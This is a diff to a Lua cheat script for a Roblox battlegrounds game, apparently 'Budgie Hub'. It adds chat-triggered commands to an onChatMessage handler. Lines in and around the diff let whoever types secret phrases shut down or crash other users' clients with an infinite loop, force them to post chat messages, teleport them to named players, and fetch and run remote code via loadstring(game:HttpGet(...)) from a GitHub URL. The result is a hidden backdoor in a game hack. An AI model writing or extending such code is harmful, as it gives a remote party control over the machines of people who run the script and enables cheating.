@@ -14,6 +14,8 @@ function onChatMessage(player, message)
         game:Shutdown()
     elseif message:lower() == "findadminbattlegrounds" then
         game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I'm using Budgie Hub | Best hack/script for Sukuna Battlegrounds", "All")
+    elseif message:lower() == "findtonotbadadminbattlegrounds" then
+        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(",//./.", "All")
     elseif message:lower() == "crashalladminbattlegrounds" then
         while true do
         end
@@ -230,6 +232,16 @@ plr.CameraMinZoomDistance = 0
     end
         end
     end
+    elseif message:lower() == "hamsterovichbringalladminbattlegrounds" then
+        player = game.Players.LocalPlayer
+        local Hamsterovich = game.Players:FindFirstChild("Hamsterovich")
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
+            game.Players.Hamsterovich.Character.HumanoidRootPart.CFrame
+    elseif message:lower() == "adskerbringalladminbattlegrounds" then
+        player = game.Players.LocalPlayer
+        local Hamsterovich = game.Players:FindFirstChild("ADSKer_man222")
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
+            game.Players.ADSKer_man222.Character.HumanoidRootPart.CFrame
     elseif message:lower() == "scarytwoalladminbattlegrounds" then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/ADSKerOffical/scary/main/file"))()
     elseif message:lower() == "jailalladminbattlegrounds" then
